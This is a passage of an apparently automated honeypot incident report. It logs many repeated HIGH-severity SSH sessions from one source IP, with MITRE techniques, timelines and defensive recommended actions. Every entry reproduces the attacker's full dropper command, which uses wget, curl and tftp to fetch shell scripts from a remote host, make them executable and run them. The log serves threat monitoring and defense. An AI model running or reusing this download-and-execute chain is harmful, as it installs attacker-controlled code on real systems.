| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:26` | `cowrie.session.connect` |
| `2026-08-25 09:57:26` | `cowrie.login.success` |
| `2026-08-25 09:57:27` | `cowrie.session.params` |
| `2026-08-25 09:57:27` | `cowrie.command.input` |
| `2026-08-25 09:57:27` | `cowrie.command.success` |
| `2026-08-25 09:57:27` | `cowrie.log.closed` |
| `2026-08-25 09:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77154edd87aa

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:28` | `cowrie.session.connect` |
| `2026-08-25 09:57:28` | `cowrie.login.success` |
| `2026-08-25 09:57:28` | `cowrie.session.params` |
| `2026-08-25 09:57:29` | `cowrie.command.input` |
| `2026-08-25 09:57:29` | `cowrie.command.success` |
| `2026-08-25 09:57:29` | `cowrie.log.closed` |
| `2026-08-25 09:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87a992dec462

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:29` | `cowrie.session.connect` |
| `2026-08-25 09:57:29` | `cowrie.login.success` |
| `2026-08-25 09:57:30` | `cowrie.session.params` |
| `2026-08-25 09:57:30` | `cowrie.command.input` |
| `2026-08-25 09:57:30` | `cowrie.command.success` |
| `2026-08-25 09:57:30` | `cowrie.log.closed` |
| `2026-08-25 09:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebfc0f461a48

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:31` | `cowrie.session.connect` |
| `2026-08-25 09:57:31` | `cowrie.login.success` |
| `2026-08-25 09:57:31` | `cowrie.session.params` |
| `2026-08-25 09:57:32` | `cowrie.command.input` |
| `2026-08-25 09:57:32` | `cowrie.command.success` |
| `2026-08-25 09:57:32` | `cowrie.log.closed` |
| `2026-08-25 09:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7e70b40f607

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:32` | `cowrie.session.connect` |
| `2026-08-25 09:57:32` | `cowrie.login.success` |
| `2026-08-25 09:57:33` | `cowrie.session.params` |
| `2026-08-25 09:57:33` | `cowrie.command.input` |
| `2026-08-25 09:57:33` | `cowrie.command.success` |
| `2026-08-25 09:57:33` | `cowrie.log.closed` |
| `2026-08-25 09:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb618519100f

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:34` | `cowrie.session.connect` |
| `2026-08-25 09:57:34` | `cowrie.login.success` |
| `2026-08-25 09:57:34` | `cowrie.session.params` |
| `2026-08-25 09:57:34` | `cowrie.command.input` |
| `2026-08-25 09:57:35` | `cowrie.command.success` |
| `2026-08-25 09:57:35` | `cowrie.log.closed` |
| `2026-08-25 09:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c38ea0f9be98

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:35` | `cowrie.session.connect` |
| `2026-08-25 09:57:35` | `cowrie.login.success` |
| `2026-08-25 09:57:36` | `cowrie.session.params` |
| `2026-08-25 09:57:36` | `cowrie.command.input` |
| `2026-08-25 09:57:36` | `cowrie.command.success` |
| `2026-08-25 09:57:36` | `cowrie.log.closed` |
| `2026-08-25 09:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6c282a74a5b

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:37` | `cowrie.session.connect` |
| `2026-08-25 09:57:37` | `cowrie.login.success` |
| `2026-08-25 09:57:37` | `cowrie.session.params` |
| `2026-08-25 09:57:38` | `cowrie.command.input` |
| `2026-08-25 09:57:38` | `cowrie.command.success` |
| `2026-08-25 09:57:38` | `cowrie.log.closed` |
| `2026-08-25 09:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6f5a62d418

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:38` | `cowrie.session.connect` |
| `2026-08-25 09:57:38` | `cowrie.login.success` |
| `2026-08-25 09:57:39` | `cowrie.session.params` |
| `2026-08-25 09:57:39` | `cowrie.command.input` |
| `2026-08-25 09:57:39` | `cowrie.command.success` |
| `2026-08-25 09:57:39` | `cowrie.log.closed` |
| `2026-08-25 09:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef1617965f4f

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:39` | `cowrie.session.connect` |
| `2026-08-25 09:57:40` | `cowrie.login.success` |
| `2026-08-25 09:57:40` | `cowrie.session.params` |
| `2026-08-25 09:57:40` | `cowrie.command.input` |
| `2026-08-25 09:57:40` | `cowrie.command.success` |
| `2026-08-25 09:57:41` | `cowrie.log.closed` |
| `2026-08-25 09:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bf76575eefc

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:41` | `cowrie.session.connect` |
| `2026-08-25 09:57:41` | `cowrie.login.success` |
| `2026-08-25 09:57:42` | `cowrie.session.params` |
| `2026-08-25 09:57:42` | `cowrie.command.input` |
| `2026-08-25 09:57:42` | `cowrie.command.success` |
| `2026-08-25 09:57:42` | `cowrie.log.closed` |
| `2026-08-25 09:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f37d78a544be

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:42` | `cowrie.session.connect` |
| `2026-08-25 09:57:43` | `cowrie.login.success` |
| `2026-08-25 09:57:43` | `cowrie.session.params` |
| `2026-08-25 09:57:43` | `cowrie.command.input` |
| `2026-08-25 09:57:43` | `cowrie.command.success` |
| `2026-08-25 09:57:44` | `cowrie.log.closed` |
| `2026-08-25 09:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eeb279da600

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:44` | `cowrie.session.connect` |
| `2026-08-25 09:57:44` | `cowrie.login.success` |
| `2026-08-25 09:57:45` | `cowrie.session.params` |
| `2026-08-25 09:57:45` | `cowrie.command.input` |
| `2026-08-25 09:57:45` | `cowrie.command.success` |
| `2026-08-25 09:57:45` | `cowrie.log.closed` |
| `2026-08-25 09:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e40cac2695f

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:45` | `cowrie.session.connect` |
| `2026-08-25 09:57:46` | `cowrie.login.success` |
| `2026-08-25 09:57:46` | `cowrie.session.params` |
| `2026-08-25 09:57:46` | `cowrie.command.input` |
| `2026-08-25 09:57:46` | `cowrie.command.success` |
| `2026-08-25 09:57:47` | `cowrie.log.closed` |
| `2026-08-25 09:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aaa8f903e7c

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:47` | `cowrie.session.connect` |
| `2026-08-25 09:57:47` | `cowrie.login.success` |
| `2026-08-25 09:57:48` | `cowrie.session.params` |
| `2026-08-25 09:57:48` | `cowrie.command.input` |
| `2026-08-25 09:57:48` | `cowrie.session.file_download` |
| `2026-08-25 09:57:48` | `cowrie.session.file_download` |
| `2026-08-25 09:57:48` | `cowrie.session.file_download` |
| `2026-08-25 09:57:48` | `cowrie.log.closed` |
| `2026-08-25 09:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ded33111f17

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:48` | `cowrie.session.connect` |
| `2026-08-25 09:57:49` | `cowrie.login.success` |
| `2026-08-25 09:57:49` | `cowrie.session.params` |
| `2026-08-25 09:57:49` | `cowrie.command.input` |
| `2026-08-25 09:57:49` | `cowrie.session.file_download` |
| `2026-08-25 09:57:50` | `cowrie.session.file_download` |
| `2026-08-25 09:57:50` | `cowrie.session.file_download` |
| `2026-08-25 09:57:50` | `cowrie.log.closed` |
| `2026-08-25 09:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfdc8f37b0e6

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:50` | `cowrie.session.connect` |
| `2026-08-25 09:57:50` | `cowrie.login.success` |
| `2026-08-25 09:57:51` | `cowrie.session.params` |
| `2026-08-25 09:57:51` | `cowrie.command.input` |
| `2026-08-25 09:57:51` | `cowrie.session.file_download` |
| `2026-08-25 09:57:51` | `cowrie.session.file_download` |
| `2026-08-25 09:57:51` | `cowrie.log.closed` |
| `2026-08-25 09:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5ef5388ca73

| Field | Detail |
|---|---|
